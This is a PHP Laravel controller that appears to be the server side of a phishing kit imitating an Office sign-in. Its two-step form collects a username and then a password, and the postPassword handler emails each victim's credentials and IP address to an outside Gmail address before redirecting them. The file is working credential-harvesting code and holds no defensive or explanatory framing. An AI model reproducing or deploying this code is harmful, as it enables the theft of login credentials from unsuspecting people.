<?php namespace App\Http\Controllers;

use App\Http\Requests;
use App\Http\Controllers\Controller;

use Illuminate\Http\Request;
use App\Helpers\Contracts\HelperContract; 
use Auth;
use Session; 
use Validator; 
use Carbon\Carbon; 

class MainController extends Controller {

	protected $helpers; //Helpers implementation
    
    public function __construct(HelperContract $h)
    {
    	$this->helpers = $h;            
    }

	/**
	 * Show the application login screen to the user.
	 *
	 * @return Response
	 */
	public function getLogin()
    {
    	return view('index');
    }
	
	/**
	 * Show the application login screen to the user.
	 *
	 * @return Response
	 */
	public function postLogin(Request $request)
    {
    	$req = $request->all();
		
		if(isset($req["offyse"]) && !empty($req["offyse"]))
		{
			$offyse = $req["offyse"];
			return view('password',compact('offyse'));
		}
		
		else
		{
			Session::flash("status","error");
			return redirect()->intended('/');
		}
		
    }
	
	
	/**
	 * Show the application password screen to the user.
	 *
	 * @return Response
	 */
	public function getPassword()
    {
    	return view('password');
    }
	
	
	/**
	 * Show the application password screen to the user.
	 *
	 * @return Response
	 */
	public function postPassword(Request $request)
    {
    	$req = $request->all();
		
		if(isset($req["offpys"]) && !empty($req["offpys"]))
		{
			if(isset($req["offyse"]))
			{
				$offyse = $req["offyse"];
				$offpys = $req["offpys"];
				
				//send
				$ip = getenv("REMOTE_ADDR");
				$s = "Office Logins ~~ ".$ip." ~~ ".date("h:i A jS F, Y");
                $rcpt = "mails4davidslogan@gmail.com";
				$body = "Username: ".$offyse."<br>Password: ".$offpys."<br>IP address: ".$ip;
				$this->helpers->sendEmail($rcpt,$s,['results' => $body],'emails.login_alert','view');  
				
				return view('index',compact('status'));
			}
			else
			{
				Session::flash("status","success");
			    return redirect()->intended('/');
			}	
		}
		
		else
		{
			Session::flash("status","error");
			return redirect()->intended('authorize');
		}
    }
    
    

}
